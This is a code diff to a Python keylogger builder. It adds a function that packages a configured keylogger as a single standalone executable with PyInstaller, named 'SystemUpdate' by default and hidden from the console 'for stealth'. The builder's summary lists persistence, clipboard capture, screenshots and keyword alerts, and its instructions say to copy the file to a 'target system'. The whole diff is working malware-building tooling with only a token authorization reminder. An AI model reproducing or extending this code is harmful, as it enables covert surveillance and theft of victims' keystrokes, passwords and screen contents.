@@ -123,6 +123,138 @@ class AdvancedKeyLoggerBuilder:
             print(f"[!] Error writing output file: {e}")
             return False
 
+    def build_executable(self, config):
+        """
+        Build executable using PyInstaller
+
+        Args:
+            config (dict): Configuration dictionary
+
+        Returns:
+            bool: Success status
+        """
+        import subprocess
+
+        print("\n" + "=" * 70)
+        print("KeyPyLogger Executable Builder v2.0")
+        print("=" * 70)
+
+        # First build the Python script
+        if not self.build(config):
+            return False
+
+        # Determine executable name
+        script_name = config.get('output_name', 'keylogger_configured.py')
+        if not script_name.endswith('.py'):
+            script_name += '.py'
+
+        exe_name = config.get('program_name', 'SystemUpdate')
+        script_path = self.output_dir / script_name
+
+        print(f"\n[*] Building executable with PyInstaller...")
+        print(f"[*] This may take a few minutes...")
+
+        # PyInstaller command
+        cmd = [
+            sys.executable, '-m', 'PyInstaller',
+            '--onefile',  # Single executable
+            '--name', exe_name,  # Executable name
+            '--distpath', str(self.output_dir / 'dist'),
+            '--workpath', str(self.output_dir / 'build_temp'),
+            '--specpath', str(self.output_dir),
+            '--clean',
+        ]
+
+        # Add noconsole on Windows for stealth
+        if sys.platform == 'win32' and config.get('self_protection', False):
+            cmd.append('--noconsole')
+
+        # Add modules as hidden imports
+        cmd.extend([
+            '--hidden-import', 'pynput',
+            '--hidden-import', 'pynput.keyboard',
+            '--hidden-import', 'pynput.mouse',
+            '--hidden-import', 'requests',
+            '--hidden-import', 'pyperclip',
+            '--hidden-import', 'PIL',
+            '--hidden-import', 'PIL.Image',
+            '--hidden-import', 'PIL.ImageGrab',
+            '--hidden-import', 'psutil',
+        ])
+
+        # Add Windows-specific imports
+        if sys.platform == 'win32':
+            cmd.extend([
+                '--hidden-import', 'win32com',
+                '--hidden-import', 'win32com.client',
+                '--hidden-import', 'win32event',
+                '--hidden-import', 'win32api',
+                '--hidden-import', 'winerror',
+                '--hidden-import', 'winreg',
+            ])
+
+        # Add the script path
+        cmd.append(str(script_path))
+
+        try:
+            # Run PyInstaller
+            result = subprocess.run(
+                cmd,
+                check=True,
+                capture_output=True,
+                text=True,
+                cwd=str(self.base_dir)
+            )
+
+            # Clean up temporary files
+            build_temp = self.output_dir / 'build_temp'
+            if build_temp.exists():
+                shutil.rmtree(build_temp)
+
+            spec_file = self.output_dir / f'{exe_name}.spec'
+            if spec_file.exists():
+                spec_file.unlink()
+
+            # Get executable path
+            exe_extension = '.exe' if sys.platform == 'win32' else ''
+            exe_path = self.output_dir / 'dist' / f'{exe_name}{exe_extension}'
+
+            if exe_path.exists():
+                print(f"\n[+] ✓ Successfully built executable!")
+                print(f"[+] Executable: {exe_path}")
+                print(f"[+] Size: {exe_path.stat().st_size / 1024 / 1024:.2f} MB")
+                print(f"\n[*] Configuration Summary:")
+                print(f"    Program Name: {exe_name}")
+                print(f"    Persistence: {'✓' if config.get('persistence') else '✗'}")
+                print(f"    Clipboard: {'✓' if config.get('clipboard') else '✗'}")
+                print(f"    Screenshots: {'✓' if config.get('screenshots') else '✗'}")
+                print(f"    Keyword Alerts: {'✓' if config.get('keyword_alerts') else '✗'}")
+                print(f"    Self-Protection: {'✓' if config.get('self_protection') else '✗'}")
+                print(f"    Health Monitoring: {'✓' if config.get('health_monitoring') else '✗'}")
+                print(f"\n[*] Next steps:")
+                print(f"    1. Copy {exe_path} to target system")
+                print(f"    2. Run directly (no Python required!)")
+                print(f"    3. Executable will handle all features automatically")
+                print(f"\n[!] Remember: Only use on authorized systems!")
+
+                return True
+            else:
+                print(f"[!] Executable not found at expected location: {exe_path}")
+                return False
+
+        except subprocess.CalledProcessError as e:
+            print(f"\n[!] PyInstaller failed!")
+            print(f"[!] Error: {e}")
+            if e.output:
+                print(f"[!] Output: {e.output}")
+            if e.stderr:
+                print(f"[!] Stderr: {e.stderr}")
+            return False
+
+        except Exception as e:
+            print(f"\n[!] Error building executable: {e}")
+            return False
+
     def interactive_build(self):
         """Interactive configuration builder"""
         print("\n" + "=" * 70)
@@ -248,16 +380,16 @@ class AdvancedKeyLoggerBuilder:
         # Build executable option
         print("\n[*] Build Options")
         print("    1. Python script (requires Python on target)")
-        print("    2. Standalone executable (no Python required) - Coming soon!")
+        print("    2. Standalone executable (no Python required)")
 
         build_type = input("\n[?] Choose build type (1 or 2, default: 1): ").strip()
 
         if build_type == "2":
-            print("\n[!] Executable building coming in next update!")
-            print("[*] Building Python script instead...")
-
-        # Build the keylogger
-        return self.build(config)
+            # Build executable
+            return self.build_executable(config)
+        else:
+            # Build Python script
+            return self.build(config)
 
     def command_line_build(self, args):
         """Build from command line arguments"""
